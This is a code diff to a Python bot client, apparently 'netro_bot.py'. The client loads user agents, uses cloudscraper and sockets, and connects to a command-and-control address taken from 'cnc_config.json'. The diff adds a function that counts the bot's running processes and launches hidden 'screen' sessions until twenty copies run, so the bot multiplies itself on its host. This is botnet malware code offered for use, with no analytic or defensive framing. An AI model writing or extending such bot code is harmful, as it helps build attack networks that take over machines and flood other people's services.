@@ -1,5 +1,6 @@
 from urllib.parse import urlparse
 import cloudscraper
+import subprocess
 import threading
 import random
 import string
@@ -10,6 +11,8 @@ import json
 import ssl
 import sys
 import os
+
+INSTANCES = 20
 
 with open("./useragents.txt", "r") as file:
     USERAGENTS = file.read().splitlines()
@@ -523,7 +526,24 @@ class NetroBot(object):
 
         return sock.send(json.dumps(message).encode() + b"\r\n\r\n")
 
+def deploy_instances():
+    total_instances = len(subprocess.getoutput("ps -ef | grep netro_bot.py | grep -v grep | grep -v SCREEN").splitlines())
+    print(f"Total Instances: {total_instances}")
+
+    if total_instances > INSTANCES:
+        exit()
+        
+    if total_instances < INSTANCES:
+        for i in range(INSTANCES - total_instances):
+            if total_instances >= INSTANCES:
+                break
+            subprocess.Popen(["screen", "-d", "-m", "python3", "netro_bot.py"])
+            time.sleep(1)
+            
+
 def main():
+    deploy_instances()
+
     config = json.load(open("cnc_config.json", "r"))
 
     netro_bot = NetroBot(host=config["IP"], port=config["PORT"])
